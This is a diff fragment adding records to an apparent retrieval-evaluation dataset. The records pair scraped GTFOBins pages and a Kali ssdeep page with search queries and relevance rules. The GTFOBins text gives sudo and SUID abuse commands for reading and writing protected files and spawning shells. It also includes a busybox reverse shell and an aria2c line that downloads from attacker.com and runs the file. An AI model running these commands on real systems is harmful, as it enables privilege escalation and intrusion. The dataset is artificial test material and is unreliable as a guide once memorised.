+      "body": ".. / as File read File read This executable can read data from local files. Comment Lines are likely leaked as error messages. Unprivileged This function can be performed by any unprivileged user. as @/path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . as @/path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. as @/path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "64d25070b5ed036a406a-0",
+          "query": "GTFOBins read protected files with setuid",
+          "information_need": "Find direct documented file reads under SUID.",
+          "rule": "Must provide a way to retrieve substantive content from a specified local file. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "192-0",
+      "doc_id": 192,
+      "title": "ash | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/ash/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 1265,
+      "body": ".. / ash Shell File write Shell This executable can spawn an interactive system shell. Unprivileged This function can be performed by any unprivileged user. ash Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . ash SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. ash -p File write This executable can write data to local files. Unprivileged This function can be performed by any unprivileged user. ash -c 'echo DATA >/path/to/output-file' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . ash -c 'echo DATA >/path/to/output-file' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. ash -p -c 'echo DATA >/path/to/output-file'",
+      "requests": [
+        {
+          "decision_id": "3f0e3967ce7aa1e839a5-0",
+          "query": "GTFOBins alternatives for Linux privileged file write",
+          "information_need": "Find a non-GTFOBins source documenting writing content to a local path with elevated privileges.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. A GTFOBins entry is not an alternative."
+        },
+        {
+          "decision_id": "53c4db07910653e4d6e7-0",
+          "query": "GTFOBins SUID write data to a file",
+          "information_need": "Find actual local file writes in an SUID context.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "6b8f93c20b2e8b08d972-0",
+          "query": "GTFOBins append data to a file with sudo",
+          "information_need": "Find sudo examples that append to an existing local file without replacing its old content.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient. Must show append behavior, not just overwriting."
+        },
+        {
+          "decision_id": "8409ed7250a69509eeaf-0",
+          "query": "GTFOBins unprivileged local file writing",
+          "information_need": "Find direct examples writing user-chosen data to a local file without elevated privileges.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. The requested unprivileged context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "390-0",
+      "doc_id": 390,
+      "title": "cat | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/cat/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 638,
+      "body": ".. / cat File read File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. cat /path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . cat /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. cat /path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "ceb61fcfd930694d687a-0",
+          "query": "GTFOBins read protected files with setuid",
+          "information_need": "Find direct documented file reads under SUID.",
+          "rule": "Must provide a way to retrieve substantive content from a specified local file. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "949-0",
+      "doc_id": 949,
+      "title": "ssdeep | Kali Linux Tools",
+      "url": "https://www.kali.org/tools/ssdeep/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 3031,
+      "body": "Packages and Binaries: libfuzzy-dev Recursive piecewise hashing tool (development headers) ssdeep is a tool for recursive computing and matching of Context Triggered Piecewise Hashing (aka Fuzzy Hashing). Fuzzy hashing is a method for comparing similar but not identical files. This tool can be used to compare files like regular hashing does (like md5sum or sha1sum) but it will find similar files with little differences. For example, it can be used to identify modified versions of known files even if data has been inserted, modified, or deleted in the new files. This package contains the developments files. Installed size: 61 KB How to install: sudo apt install libfuzzy-dev Dependencies: libfuzzy2 libfuzzy2 Recursive piecewise hashing tool (library) ssdeep is a tool for recursive computing and matching of Context Triggered Piecewise Hashing (aka Fuzzy Hashing). Fuzzy hashing is a method for comparing similar but not identical files. This tool can be used to compare files like regular hashing does (like md5sum or sha1sum) but it will find similar files with little differences. For example, it can be used to identify modified versions of known files even if data has been inserted, modified, or deleted in the new files. This package contains the library. Installed size: 50 KB How to install: sudo apt install libfuzzy2 Dependencies: libc6 ssdeep Recursive piecewise hashing tool ssdeep is a tool for recursive computing and matching of Context Triggered Piecewise Hashing (aka Fuzzy Hashing). Fuzzy hashing is a method for comparing similar but not identical files. This tool can be used to compare files like regular hashing does (like md5sum or sha1sum) but it will find similar files with little differences. For example, it can be used to identify modified versions of known files even if data has been inserted, modified, or deleted in the new files. This package is useful in forensics investigations. Installed size: 83 KB How to install: sudo apt install ssdeep Dependencies: libc6 libgcc-s1 libstdc++6 ssdeep Computes context triggered piecewise hashes (fuzzy hashes) root@kali:~# ssdeep -h ssdeep version 2.14.1 by Jesse Kornblum and the ssdeep Project For copyright information, see man page or README.TXT. Usage: ssdeep [-m file] [-k file] [-dpgvrsblcxa] [-t val] [-h|-V] [FILES] -m - Match FILES against known hashes in file -k - Match signatures in FILES against signatures in file -d - Directory mode, compare all files in a directory -p - Pretty matching mode. Similar to -d but includes all matches -g - Cluster matches together -v - Verbose mode. Displays filename as its being processed -r - Recursive mode -s - Silent mode; all errors are suppressed -b - Uses only the bare name of files; all path information omitted -l - Uses relative paths for filenames -c - Prints output in CSV format -x - Compare FILES as signature files -a - Display all matches, regardless of score -t - Only displays matches above the given threshold -h - Display this help message -V - Display version number and exit",
+      "requests": [
+        {
+          "decision_id": "5ee82b1f143a00dba48b-0",
+          "query": "compare GTFOBins and Kali sudo tool documentation",
+          "information_need": "Find actual sudo behavior or workflow examples from either source.",
+          "rule": "Substantive sudo functionality from either named source; routine installation commands alone are insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "55-0",
+      "doc_id": 55,
+      "title": "acr | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/acr/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 1103,
+      "body": ".. / acr Command Command This executable can run non-interactive system commands. Unprivileged This function can be performed by any unprivileged user. echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file chmod +x /path/to/temp-file acr -r ./relative/path/to/temp-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file chmod +x /path/to/temp-file acr -r ./relative/path/to/temp-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. Remarks This executable runs commands using the system shell, e.g., via functions like system , so it only works for distributions where the shell does not drop SUID privileges. echo -e 'x:\\n\\t/bin/sh 1>&0 2>&0' >/path/to/temp-file chmod +x /path/to/temp-file acr -r ./relative/path/to/temp-file",
+      "requests": [
+        {
+          "decision_id": "aff3bec929b4ac8e101f-0",
+          "query": "GTFOBins sudo noninteractive command execution",
+          "information_need": "Find a documented sudo technique to run noninteractive commands, without needing an interactive shell.",
+          "rule": "A direct documented command execution method can qualify; a page with only interactive shell, file read, write, or inheritance cannot. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "345-0",
+      "doc_id": 345,
+      "title": "busybox | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/busybox/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 2315,
+      "body": ".. / busybox Reverse shell Upload Inherit Shell File write File read Comment BusyBox may contain many utilities, run busybox --list-full to check what other binaries are supported. Reverse shell This executable can send back a reverse system shell to a listening attacker. Unprivileged This function can be performed by any unprivileged user. busybox nc -e /bin/sh attacker.com 12345 Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . busybox nc -e /bin/sh attacker.com 12345 Listener A TCP server can be used on the attacker box to receive the shell. nc -l -p 12345 Upload This executable can upload local data. Comment This serves files in the local folder via an HTTP server. Unprivileged This function can be performed by any unprivileged user. busybox httpd -f -p 12345 -h . Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . busybox httpd -f -p 12345 -h . Receiver An HTTP client can be used on the attacker box to receive the data. curl victim.com -o /path/to/output-file Inherit This executable can inherit functions from another. Unprivileged This function can be performed by any unprivileged user. busybox ash Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . busybox ash Functions Inherits from ash , thus possibly granting the following functions: Shell File write Unprivileged This function can be performed by any unprivileged user. busybox cat Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . busybox cat Functions Inherits from cat , thus possibly granting the following functions: File read",
+      "requests": [
+        {
+          "decision_id": "166207f3015c31b249a2-0",
+          "query": "GTFOBins unprivileged connect back shell",
+          "information_need": "Find a direct reverse-shell example in an unprivileged context.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested unprivileged context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "2736240f18c92b83a918-0",
+          "query": "GTFOBins SUID reverse shell examples",
+          "information_need": "Find a direct outbound shell example for an executable with SUID.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "31d746fc5feabcfa7647-0",
+          "query": "GTFOBins reverse shell through sudo",
+          "information_need": "Find direct reverse-shell examples documented with sudo.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "6b4b70abd336df1ef172-0",
+          "query": "GTFOBins outbound shell examples",
+          "information_need": "Locate direct outbound reverse-shell examples in GTFOBins.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone."
+        },
+        {
+          "decision_id": "6be903a9bec8370a4697-0",
+          "query": "reverse shell examples from GTFOBins",
+          "information_need": "Find executable entries in the GTFOBins collection that document an outbound reverse shell.",
+          "rule": "GTFOBins page with a reverse shell function or an actual reverse-shell example. A local shell, a bind shell, or mere mention is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "515-0",
+      "doc_id": 515,
+      "title": "cp | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/cp/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 3064,
+      "body": ".. / cp File write File read Privilege escalation File write This executable can write data to local files. Unprivileged This function can be performed by any unprivileged user. echo DATA | cp /dev/stdin /path/to/output-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . echo DATA | cp /dev/stdin /path/to/output-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. echo DATA | cp /dev/stdin /path/to/output-file File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. cp /path/to/input-file /dev/stdout Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . cp /path/to/input-file /dev/stdout SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. cp /path/to/input-file /dev/stdout Privilege escalation This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable. Comment This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of cp has the --parents option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.) Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . cp /path/to/input-file /path/to/output-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. cp /path/to/input-file /path/to/output-file Comment This can copy SUID permissions from any SUID binary (e.g., /path/to/input-file ) to another. Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file",
+      "requests": [
+        {
+          "decision_id": "0389a37e319b4cf355a1-0",
+          "query": "GTFOBins SUID write data to a file",
+          "information_need": "Find actual local file writes in an SUID context.",
+          "rule": "Must show writing actual content to a selected local file; deleting, truncating without writing content, reading, or mere classification does not count. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "265-0",
+      "doc_id": 265,
+      "title": "base64 | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/base64/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 704,
+      "body": ".. / base64 File read File read This executable can read data from local files. Unprivileged This function can be performed by any unprivileged user. base64 /path/to/input-file | base64 --decode Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . base64 /path/to/input-file | base64 --decode SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. base64 /path/to/input-file | base64 --decode",
+      "requests": [
+        {
+          "decision_id": "2df47cc2e698bb6fbd64-0",
+          "query": "GTFOBins read protected files with setuid",
+          "information_need": "Find direct documented file reads under SUID.",
+          "rule": "Must provide a way to retrieve substantive content from a specified local file. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "90-0",
+      "doc_id": 90,
+      "title": "aoss | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/aoss/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 424,
+      "body": ".. / aoss Shell Shell This executable can spawn an interactive system shell. Unprivileged This function can be performed by any unprivileged user. aoss /bin/sh Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aoss /bin/sh",
+      "requests": [
+        {
+          "decision_id": "ea8b7b340b6da539da05-0",
+          "query": "GTFOBins contribution schema and examples",
+          "information_need": "Find GTFOBins contributor documentation that explains entry schemas.",
+          "rule": "Official documentation explaining the functions and contexts schema. An executable example without schema is nonrelevant."
+        }
+      ]
+    },
+    {
+      "chunk_id": "519-0",
+      "doc_id": 519,
+      "title": "cpan | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/cpan/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 646,
+      "body": ".. / cpan Inherit Shell Reverse shell File read Upload Download Inherit This executable can inherit functions from another. Comment Perl code can be executed with the ! command. Unprivileged This function can be performed by any unprivileged user. cpan ! ... Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . cpan ! ... Functions Inherits from perl , thus possibly granting the following functions: Shell Reverse shell File read Upload Download",
+      "requests": [
+        {
+          "decision_id": "0c6beaae64bcb71d991d-0",
+          "query": "GTFOBins reverse shell through sudo",
+          "information_need": "Find direct reverse-shell examples documented with sudo.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "7c890044372cbb4bda3c-0",
+          "query": "reverse shell examples from GTFOBins",
+          "information_need": "Find executable entries in the GTFOBins collection that document an outbound reverse shell.",
+          "rule": "GTFOBins page with a reverse shell function or an actual reverse-shell example. A local shell, a bind shell, or mere mention is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "150-0",
+      "doc_id": 150,
+      "title": "aria2c | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/aria2c/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 4308,
+      "body": ".. / aria2c Command File read Download Command This executable can run non-interactive system commands. Comment Note that the subprocess is immediately sent to the background. Unprivileged This function can be performed by any unprivileged user. echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. Remarks This executable runs commands using the system shell, e.g., via functions like system , so it only works for distributions where the shell does not drop SUID privileges. echo /path/to/command >/path/to/temp-file chmod +x /path/to/temp-file aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain Comment The remote file aaaaaaaaaaaaaaaa (must be a string of 16 hex digit) contains the shell script, e.g., /path/to/command . Note that said file needs to be written on disk in order to be executed. --allow-overwrite is needed if this is executed multiple times with the same GID. Unprivileged This function can be performed by any unprivileged user. aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. Remarks This executable runs commands using the system shell, e.g., via functions like system , so it only works for distributions where the shell does not drop SUID privileges. aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa File read This executable can read data from local files. Comment The file is leaked as error messages. Unprivileged This function can be performed by any unprivileged user. aria2c -i /path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c -i /path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. aria2c -i /path/to/input-file Remarks The content is corrupted or otherwise altered by the process, thus it might not be suitable for handling arbitrary binary data. Download This executable can download remote data. Comment Use --allow-overwrite if needed. Similarly -o /path/to/ouput-file can be omitted, in that case the file is saved to input-file in the current working directory. Unprivileged This function can be performed by any unprivileged user. aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. aria2c -o /path/to/ouput-file http://attacker.com/path/to/input-file",
+      "requests": [
+        {
+          "decision_id": "0392afa3d07d94dc8fe9-0",
+          "query": "GTFOBins sudo noninteractive command execution",
+          "information_need": "Find a documented sudo technique to run noninteractive commands, without needing an interactive shell.",
+          "rule": "A direct documented command execution method can qualify; a page with only interactive shell, file read, write, or inheritance cannot. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    },
+    {
+      "chunk_id": "311-0",
+      "doc_id": 311,
+      "title": "bee | GTFOBins",
+      "url": "https://gtfobins.org/gtfobins/bee/",
+      "description": "",
+      "body_start": 0,
+      "body_end": 982,
+      "body": ".. / bee Inherit Shell Command Reverse shell File write File read Upload Download Inherit This executable can inherit functions from another. Comment This allows to run PHP code ( ... ). This must be excuted from the Backdrop CMS root directory (e.g. /var/www/html ), alternatively use the --root option. Unprivileged This function can be performed by any unprivileged user. bee eval '...' Sudo This function is performed by the privileged user if executed via sudo because the acquired privileges are not dropped. Remarks If there are environment variables involved, they must be passed via sudo VAR=value ... or exported then sudo -E ... . bee eval '...' SUID This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the effective privileges are not dropped. bee eval '...' Functions Inherits from php , thus possibly granting the following functions: Shell Command Reverse shell File write File read Upload Download",
+      "requests": [
+        {
+          "decision_id": "d554fd4a8bd433a95c44-0",
+          "query": "GTFOBins SUID reverse shell examples",
+          "information_need": "Find a direct outbound shell example for an executable with SUID.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested SUID context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        },
+        {
+          "decision_id": "e2c33a53c962c5e706f1-0",
+          "query": "GTFOBins reverse shell through sudo",
+          "information_need": "Find direct reverse-shell examples documented with sudo.",
+          "rule": "Only a direct outbound shell function or complete example on an executable entry qualifies. Do not count bind/local shells, contributor pages, or possible inheritance alone. The requested sudo context must belong to that very function and example. Context mentioned elsewhere on the page is insufficient."
+        }
+      ]
+    }
+  ]
+}
